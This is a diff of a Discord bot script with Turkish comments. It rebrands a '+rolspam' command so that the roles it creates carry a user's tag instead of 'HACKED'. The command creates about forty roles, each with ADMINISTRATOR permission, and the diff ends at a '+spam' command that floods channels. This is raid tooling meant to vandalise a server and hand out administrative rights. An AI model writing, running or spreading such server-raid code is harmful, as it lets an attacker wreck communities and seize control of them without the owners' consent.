@@ -1266,202 +1266,203 @@ client.on("message", async msg => {
   }   ///null
 });
 
- //www.youtube.com/ENESACARYT TARAFINDAN YAPILMISTIR
+
 
     client.on("message", msg => {
   if (msg.content === "+rolspam") {  //ROL SPAM YAPAR
     msg.delete();
     msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "A93D3D",
       permissions: ["ADMINISTRATOR"]
     });
         msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "C22F2F",
       permissions: ["ADMINISTRATOR"]
     });
             msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "E12020",
       permissions: ["ADMINISTRATOR"]
     });
                 msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "FF0000",
       permissions: ["ADMINISTRATOR"]
     });
                 msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "FF3E00",
       permissions: ["ADMINISTRATOR"]
     });
                 msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "FF4D00",
       permissions: ["ADMINISTRATOR"]
     });
                 msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "FF6C00",
       permissions: ["ADMINISTRATOR"]
     });
                 msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "FF9300",
       permissions: ["ADMINISTRATOR"]
     });
                 msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "FFAE00",
       permissions: ["ADMINISTRATOR"]
     });
                 msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "FFD500",
       permissions: ["ADMINISTRATOR"]
     });
                 msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "FFFF00",
       permissions: ["ADMINISTRATOR"]
     });
                 msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "E0FF00",
       permissions: ["ADMINISTRATOR"]
     });
                 msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "C1FF00",
       permissions: ["ADMINISTRATOR"]
     });
                 msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "93FF00",
       permissions: ["ADMINISTRATOR"]
     });
                 msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "74FF00",
       permissions: ["ADMINISTRATOR"]
     });
                 msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "3EFF00",
       permissions: ["ADMINISTRATOR"]
     });
                 msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "0CFF00",
       permissions: ["ADMINISTRATOR"]
     });
                 msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "00FF2E",
       permissions: ["ADMINISTRATOR"]
     });
                 msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "00FF6C",
       permissions: ["ADMINISTRATOR"]
     });
                 msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "00FFA6",
       permissions: ["ADMINISTRATOR"]    });
                     msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "00FFD4",
       permissions: ["ADMINISTRATOR"]
     });
                     msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "00FFFB",
       permissions: ["ADMINISTRATOR"]
     });
                     msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "00C9FF",
       permissions: ["ADMINISTRATOR"]
     });
                     msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "009BFF",
       permissions: ["ADMINISTRATOR"]
     });
                     msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "006CFF",
       permissions: ["ADMINISTRATOR"]
     });
                     msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "003AFF",
       permissions: ["ADMINISTRATOR"]
     });
                     msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "001BFF",
       permissions: ["ADMINISTRATOR"]
     });
                     msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "1F00FF",
       permissions: ["ADMINISTRATOR"]
     });
                     msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "4200FF",
       permissions: ["ADMINISTRATOR"]
     });
                     msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "7C00FF",
       permissions: ["ADMINISTRATOR"]
     });
                     msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "A200FF",
       permissions: ["ADMINISTRATOR"]
     });
                     msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "C500FF",
       permissions: ["ADMINISTRATOR"]
     });
                     msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "E000FF",  ///null
       permissions: ["ADMINISTRATOR"]
     });
                     msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "FF00F3",
       permissions: ["ADMINISTRATOR"]
     });
                     msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "FF00B6",
       permissions: ["ADMINISTRATOR"]
     });
                     msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "FF0097",
       permissions: ["ADMINISTRATOR"]
     });
                     msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "FF005D",
       permissions: ["ADMINISTRATOR"]
     });
                     msg.guild.createRole({
-      name: "HACKED",
+      name: "MELIK AMA YIKIK OLANDAN ALAYIM#0061",
       color: "FF0032",
       permissions: ["ADMINISTRATOR"]
     });
   }
 });
+
 
 client.on('message', msg => {
   if (msg.content === '+spam') { //KOMUTU YAZDIGINIZ KANALA SPAM ATAR
